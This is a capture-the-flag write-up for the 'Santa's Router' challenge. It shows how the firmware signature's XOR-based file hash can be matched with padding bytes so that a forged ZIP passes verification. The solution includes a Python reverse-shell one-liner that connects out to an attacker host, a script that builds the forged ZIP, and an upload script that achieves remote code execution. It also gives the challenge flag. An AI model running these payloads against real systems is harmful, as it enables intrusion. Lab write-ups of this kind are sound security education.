# 13 - Santa's Router

## Description

Level: Medium<br/>
Author: Fabi_07

Santa came across a weird service that provides something with signatures of a firmware. He isn't really comfortable
with all that crypto stuff, can you help him with this?

## Solution

For this challenge we are given a remote server as well as the [challenge source code](santas-router-source.zip).
The server gives us a few options when we connect to it using netcat:

```
help - displays this menu
version - displays the current version of the firmware
update - updates the firmware with the provided signed zip file
exit - exit this shell
```

With `version` we can obtain the signature of the firmware that is currently uploaded. With `update` we can update the
firmware by uploading a Base64 encoded ZIP file as well as its signature.

```python
def verifyAndExtractZipFile(fileContentEncoded: str, signature: str):
    try:
        fileContent = base64.b64decode(fileContentEncoded)
    except binascii.Error:
        print('Invalid Base64 file')
        return
    try:
        if not verifySignature(fileContent, signature):
            print("Signature is invalid")
            return
    except binascii.Error:
        print('Invalid Base64 signature')
        return
    files = zipfile.ZipFile(io.BytesIO(fileContent))
    startFile = [x for x in files.filelist if 'start.sh' in x.filename]
    if len(startFile) == 0:
        print("No start.sh included in the firmware")
        return
    filePath = files.extract(startFile[0], path='./www/root/')
    p = subprocess.Popen(['/bin/sh', filePath], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print(f'Update exited with statuscode {p.wait()}')
```

Form the source we can see that if the uploaded file has a correct signature (as checked by `verifySignature`) then
the `start.sh` of the ZIP file is executed. With this we will be able to exfiltrate the flag. The author probably
intended for us to use the statuscode to leak the flag, I decided to get a remote shell instead.

```python
def hashFile(fileContent: bytes) -> int:
    hash = 0
    for i in range(0, len(fileContent), 8):
        hash ^= sum([fileContent[i + j] << 8 * j for j in range(8) if i + j < len(fileContent)])
    return hash


def verifySignature(fileContent: bytes, signatureEncoded: str) -> bool:
    signature = base64.b64decode(signatureEncoded)
    hash = hashFile(fileContent)
    try:
        pkcs1_15.new(KEY).verify(SHA1.new(hex(hash).encode()), signature)
        return True
    except ValueError:
        return False
```

This is the part where the signature is computed. First, the hash of the file is calculated as the XOR value of the
little endian interpretation of 8 byte blocks. Then, the verification happens using PKCS#1 and since we don't have the
private key of the RSA key, we probably won't be able to attack the signature verification itself. The `hashFile`
function, on the other hand, is interesting since we can influence the output. We know that we can use the fact that
XORing a value with itself results in `0`:

```python
hashFile(b'ABCDEFGH' + b'ABCDEFGH') == 0
```

Since we have the original hash of the file, we can simply modify the ZIP file such that the hash does not change.
To do this, we first calculate the expected hash:

```python
def hashFile(fileContent: bytes) -> int:
    hash = 0
    for i in range(0, len(fileContent), 8):
        hash ^= sum([fileContent[i + j] << 8 * j for j in range(8) if i + j < len(fileContent)])
    return hash


data = open("firmware.zip", "rb").read()
print(hashFile(data))
```

With this we obtain the expected hash `2222991296195092273`. Now we can modify the `start.sh` of the ZIP file:

```sh
export RHOST="<IP>";
export RPORT=9001;
python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

This shell script creates a reverse shell in Python. Unfortunately, I lost quite a lot of time here since other reverse
shells didn't work out of the box. Now we can simply pad the ZIP file to a multiple of 8 bytes by adding zero bytes and
finally calculate the missing value to obtain the expected hash:

```python
zip_buffer = io.BytesIO()

with zipfile.ZipFile(zip_buffer, "a", zipfile.ZIP_DEFLATED, False) as zip_file:
    zip_file.writestr('start.sh', b'''
    export RHOST="<IP>";
    export RPORT=9001;
    python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")' \
    ''')


def hashFile(fileContent: bytes) -> int:
    hash = 0
    for i in range(0, len(fileContent), 8):
        hash ^= sum([fileContent[i + j] << 8 * j for j in range(8) if i + j < len(fileContent)])
    return hash


def int_to_bytes(x: int) -> bytes:
    return x.to_bytes((x.bit_length() + 7) // 8, 'big')


content = bytearray(zip_buffer.getvalue())

# Pad the content with zero bytes such that the length is a multiple of 8 bytes
for i in range(8 - len(content) % 8):
    content.append(0)

assert len(content) % 8 == 0

expectedHash = 2222991296195092273
currentHash = hashFile(content)
diff = currentHash ^ expectedHash

magic = int_to_bytes(diff)[::-1]  # reverse due to little endian encoding
content = content + magic

assert hashFile(content) == expectedHash
```

Now we have a ZIP file with some zero bytes as well as some bytes to make the signature identical to the initial
one. Luckily, the ZIP file still extracts without any error and we can upload it to get RCE:

```python
io = remote('<INSTANCE>.rdocker.vuln.land', 1337)
io.recvuntil(b'$')
io.sendline(b'version')
io.recvline()

signature = io.recvline().split(b'Signature: ')[1][:-1]

io.sendline(b'update')
io.sendline(base64.b64encode(content))
io.sendline(signature)

io.interactive()
```

Now, we can just `cat flag` and get `HV23{wait_x0r_is_not_a_secure_hash_function}`. The full solver script can be found
in [solve.py](solve.py).
